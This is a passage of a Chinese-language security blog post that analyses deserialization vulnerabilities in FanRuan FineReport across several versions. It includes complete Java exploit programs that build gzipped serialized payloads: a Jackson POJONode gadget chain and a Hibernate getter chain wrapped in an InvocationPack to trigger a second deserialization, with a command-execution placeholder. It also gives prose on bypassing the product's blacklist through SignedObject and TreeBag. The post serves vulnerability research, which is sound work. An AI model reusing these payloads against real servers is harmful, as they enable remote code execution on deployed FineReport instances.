javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.Reflections;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jacksonv10_0_15</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;Filter.class&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        <span class="comment">// 将修改后的CtClass加载至当前线程的上下文类加载器中</span></span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(valfield);</span><br><span class="line">        valfield.set(badAttributeValueExpException, node);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(bao);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(gzout);</span><br><span class="line">        out.writeObject(badAttributeValueExpException);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        gzout.close();</span><br><span class="line">        FileUtils.writeByteArrayToFile(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;jackson.ser&quot;</span>), bao.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="V10-0-19-2022-08-02"><a href="#V10-0-19-2022-08-02" class="headerlink" title="V10.0.19-2022.08.02"></a>V10.0.19-2022.08.02</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在这个版本中往下面看了几行代码发现调用了readParams方法对反序列化后生成的InvocationPack对象中的params属性进行处理</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019145933-slmtoi0.png" alt="image"></p>
<p>跟入方法SerializerHelper.deserialize(var1[var3], this.paramSerializer)进行序列化处理，此时的this.paramSerializer值在继续直接查看漏洞入口点，InvocationSerializer.getDefault()拿到实例后，默认的var1为null，此时的paramSerializer就是为SerializerSummaryAdaptor</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019145950-w13746w.png" alt="image"></p>
<p>那么此时调用的SerializerHelper.deserialize(var1[var3], this.paramSerializer)就是SerializerSummaryAdaptor#deserialize，就是一个jdk原始的反序列化，这里触发二次反序列化漏洞</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150018-azmnsct.png" alt="image"></p>
<p>接着回到上面的分析this.readParams(var3.params),params是InvocationSerializer的内部类InvocationPack的属性值类型为一个二维数组，且构造方法中的var4有对params进行赋值操作</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150033-8wuamrl.png" alt="image"></p>
<p>那么我们是不是可以拿到InvocationPack对象后通过构造函数传入恶意字节码赋值给params，this.readParams方法就会进行二次解析造成反序列化漏洞</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有几个细节需要注意下最后构造的时候为什么要传入一个空的hashmap对象out.writeObject(new HashMap());，是因为漏洞触发点的时候进行一次map对象反序列化，所以需要构造一个空的hashmap</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150116-g9hbur7.png" alt="image"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fr10chnel</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt;, DynamicDependencies &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">fr10chnel</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isApplicableJavaVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAtLeast(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String[] getDependencies() &#123;</span><br><span class="line">        <span class="keyword">return</span> System.getProperty(<span class="string">&quot;hibernate5&quot;</span>) != <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;com.fr.third.org.hibernate:hibernate-core:5.0.7.Final&quot;</span>, <span class="string">&quot;aopalliance:aopalliance:1.0&quot;</span>, <span class="string">&quot;com.fr.third.org.jboss.logging:jboss-logging:3.3.0.Final&quot;</span>, <span class="string">&quot;javax.transaction:javax.transaction-api:1.2&quot;</span>&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;com.fr.third.org.hibernate:hibernate-core:4.3.11.Final&quot;</span>, <span class="string">&quot;aopalliance:aopalliance:1.0&quot;</span>, <span class="string">&quot;com.fr.third.org.jboss.logging:jboss-logging:3.3.0.Final&quot;</span>, <span class="string">&quot;javax.transaction:javax.transaction-api:1.2&quot;</span>, <span class="string">&quot;dom4j:dom4j:1.6.1&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGetter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> makeHibernate5Getter(tplClass, method);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeHibernate4Getter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; getterIf = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.Getter&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; basicGetter = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">        Reflections.setAccessible(bgCon);</span><br><span class="line">        <span class="keyword">if</span> (!method.startsWith(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Hibernate4 can only call getters&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> Character.toLowerCase(method.charAt(<span class="number">3</span>)) + method.substring(<span class="number">4</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">g</span> <span class="operator">=</span> bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">arr</span> <span class="operator">=</span> Array.newInstance(getterIf, <span class="number">1</span>);</span><br><span class="line">            Array.set(arr, <span class="number">0</span>, g);</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeHibernate5Getter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> NoSuchMethodException, SecurityException, ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; getterIf = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.access.spi.Getter&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; basicGetter = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">g</span> <span class="operator">=</span> bgCon.newInstance(tplClass, <span class="string">&quot;test&quot;</span>, tplClass.getDeclaredMethod(method));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arr</span> <span class="operator">=</span> Array.newInstance(getterIf, <span class="number">1</span>);</span><br><span class="line">        Array.set(arr, <span class="number">0</span>, g);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> makeGetter(tpl.getClass(), <span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> makeCaller(tpl, getters);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeCaller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> makeHibernate45Caller(tpl, getters);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeHibernate45Caller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">PojoComponentTuplizer</span> <span class="variable">tup</span> <span class="operator">=</span> (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;getters&quot;</span>).set(tup, getters);</span><br><span class="line">        <span class="type">ComponentType</span> <span class="variable">t</span> <span class="operator">=</span> (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;componentTuplizer&quot;</span>, tup);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertySpan&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertyTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;t&#125;);</span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>(t, (Object)<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>(t, (Object)<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="keyword">return</span> Gadgets.makeMap(v1, v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeHibernate3Caller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">entityEntityModeToTuplizerMappingClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">entityModeToTuplizerMappingClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.tuple.EntityModeToTuplizerMapping&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">typedValueClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.engine.TypedValue&quot;</span>);</span><br><span class="line">        <span class="type">PojoComponentTuplizer</span> <span class="variable">tup</span> <span class="operator">=</span> (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;getters&quot;</span>).set(tup, getters);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;propertySpan&quot;</span>).set(tup, <span class="number">1</span>);</span><br><span class="line">        <span class="type">ComponentType</span> <span class="variable">t</span> <span class="operator">=</span> (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hm.put(EntityMode.POJO, tup);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">emtm</span> <span class="operator">=</span> Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;hm&#125;);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;tuplizerMapping&quot;</span>, emtm);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertySpan&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertyTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;t&#125;);</span><br><span class="line">        Constructor&lt;?&gt; typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">v1</span> <span class="operator">=</span> typedValueConstructor.newInstance(t, <span class="literal">null</span>, EntityMode.POJO);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> typedValueConstructor.newInstance(t, <span class="literal">null</span>, EntityMode.POJO);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="keyword">return</span> Gadgets.makeMap(v1, v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;raw_cmd:touch /tmp/succ.log&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(cmd);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> makeGetter(tpl.getClass(), <span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objBefore</span> <span class="operator">=</span> makeCaller(tpl, getters);</span><br><span class="line">        Object[] objectArray = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;objBefore&#125;;</span><br><span class="line">        <span class="type">byte</span>[][] result = writeParams(objectArray);</span><br><span class="line">        <span class="comment">// 构造 InvocationPack 对象  恶意内容放params</span></span><br><span class="line">        <span class="comment">// 获取类对象</span></span><br><span class="line">        Class&lt;?&gt; InvocationSerializerclazz = Class.forName(<span class="string">&quot;com.fr.rpc.serialization.InvocationSerializer&quot;</span>,<span class="literal">false</span>,Thread.currentThread().getContextClassLoader());</span><br><span class="line">        <span class="comment">// 获取私有静态 内部类  InvocationPack</span></span><br><span class="line">        Class&lt;?&gt; innerClass = InvocationSerializerclazz.getDeclaredClasses()[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//拿到内部类的所有构造函数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">invocationPacconstructors</span> <span class="operator">=</span> innerClass.getDeclaredConstructor(String.class, String.class, Class[].class, <span class="type">byte</span>[][].class);</span><br><span class="line">        invocationPacconstructors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">invocationPackObj</span> <span class="operator">=</span> invocationPacconstructors.newInstance(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, result);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(bao);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(gzout);</span><br><span class="line">        out.writeObject(invocationPackObj);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        gzout.close();</span><br><span class="line">        com.fr.third.org.apache.commons.io.FileUtils.writeByteArrayToFile(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;hello-read-parme-success.ser&quot;</span>), bao.toByteArray());</span><br><span class="line"><span class="comment">//        FileOutputStream fileOut = new FileOutputStream(&quot;hello-read-parme-succ.ser&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream out = new ObjectOutputStream(fileOut);</span></span><br><span class="line"><span class="comment">//        out.writeObject(invocationPackObj);</span></span><br><span class="line"><span class="comment">//        out.close();</span></span><br><span class="line"><span class="comment">//        fileOut.close();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[][] writeParams(Object[] var1) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>][];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[][] var2 = <span class="keyword">new</span> <span class="title class_">byte</span>[var1.length][];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var1.length; ++var3) &#123;</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">                objectOutputStream.writeObject(var1[var3]);</span><br><span class="line">                objectOutputStream.close();</span><br><span class="line">                var2[var3] = byteArrayOutputStream.toByteArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="V10-0-19-2023-03"><a href="#V10-0-19-2023-03" class="headerlink" title="V10.0.19-2023.03"></a>V10.0.19-2023.03</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在2023.03月份的版本中继续添加了黑名单，在第二题中的badAttributeValueExpException已经在黑名单中了，导致无法触发POJONode；</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150205-7y7g44f.png" alt="image"></p>
<p>那么我们就需要重新找一条利用链tostring到POJONode，POJONode就能触发templateimpl导致任意类调用。</p>
<p>难受的是这里的templateimpl也是被ban了，就无法触发加载自定义class了</p>
<p>庆幸的是二次反序列化的利用链SignedObject并不在黑名单中，在SignedObject的getObject方法中会对content属性进行二次readObject，而且centent的值又是通过构造函数传入进来的可控，那么就可以通过SignedObject包装一下template导致触发二次反序列化漏洞</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150308-ibheouy.png" alt="image"></p>
<p>那么理一理现在思路，大概思路如下，我们就需要找一个类通过tostring调用到POJONode类即可串联整个利用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x类</span><br><span class="line">	--&gt;POJONode(调用任意类的getter函数)</span><br><span class="line">		----&gt;signerObject#getObject二次反序列化</span><br><span class="line">				----&gt;触发template代码执行</span><br></pre></td></tr></table></figure>

<p>那么我们现在需要找一个入口类，发现CC4利用链变种利用链Treebag[1]，并不在黑名单中，Treebag可以使用触发 Comparator 接口的 compare 方法</p>
<p>在Treebag的readObject方法中，在反序列化的时候，会将反序列化出来的Comparator对象传入TreeMap进行处理</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150353-eg2px1u.png" alt="image"></p>
<p>接下来将调用父类的doReadObject方法，会调用treemap#put方法</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150406-uysauap.png" alt="image"></p>
<p>在treemap#put的方法中会对k进行compare(key, key);处理；同样使用了comparator.compare进行比较</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150418-m03iq6p.png" alt="image"></p>
<p>而在构造函数中可以传入一个Comparator对象，将它传入TreeMap中，<img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150434-n9ybka7.png" alt="image"></p>
<p>那么接下来我们查找的利用链就可以简单概括为，是否有可用的 Comparator 的实现类，它可序列化并且 compare 会调用 toString 方法</p>
